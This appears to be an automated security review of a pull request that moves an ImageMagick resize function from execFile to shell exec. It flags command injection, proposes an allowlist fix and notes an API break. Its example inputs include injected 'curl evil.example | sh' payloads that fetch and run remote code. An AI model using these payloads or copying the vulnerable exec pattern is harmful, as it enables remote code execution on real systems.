findings.body:
`exec()` runs the command through a shell. Interpolating `src` and `filter` into the template lets a caller inject metacharacters and run arbitrary commands (e.g. `filter` = `Lanczos; curl evil.example | sh`, or `src` breaking out of the double quotes).

ImageMagick `-filter` values are a fixed set of names and do not need a shell. Keep `execFile`/`spawn` with an argv array and validate `filter` against an allowlist:

```suggestion
    execFile("convert", [src, "-filter", filter, "-resize", `${w}x`, "/tmp/out.png"], (e) => e ? rej(e) : res("/tmp/out.png"));
```

(Restore the `execFile` import; reject unknown filter names before invoking convert.)

`resize(src, w)` becomes `resize(src, filter, w)`. Any existing caller still passing width as the second argument will treat a number as the filter string and shift arguments, producing failed converts or odd shell expansion of `${w}`. If this is intentional API evolution, use an options object or add an overload/wrapper so `(src, w)` keeps working; otherwise document and bump a major version.

summary:
## Verdict

**Do not merge** — this change introduces remote/local command injection by switching from `execFile` (argv, no shell) to `exec` (shell) and interpolating caller-controlled `src` and `filter` into the command string.

## Analysis

`resize()` previously invoked ImageMagick via `execFile("convert", [src, "-resize", ...])`, which never spawns a shell and treats each argument as a literal. The new code builds:

```ts
exec(`convert "${src}" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)
```

Both `src` and `filter` are plain `string` parameters with no allowlist or escaping. A filter like `Lanczos; id` or a path like `" ; curl evil | sh ; "` runs arbitrary commands with the process privileges. The inline comment states the shell is intentional for "user-composed filter expressions," which is exactly the untrusted-input case that must not go through a shell.

ImageMagick filter names are a fixed vocabulary (`Lanczos`, `Mitchell`, `Catrom`, …). They do not require shell metacharacter support. Keep `execFile` / `spawn` with an argv array and validate `filter` against an allowlist (and keep `src` as a single argv element).

Also note the public signature change (`filter` inserted as the second parameter) will break any existing callers that still pass `(src, w)`.

**Recommendation:** request-changes

verification.reason: The head code uses child_process.exec with unsanitized src and filter interpolated into a shell command string; base used execFile with an argv array. That is a real command-injection regression, and critical severity is appropriate.
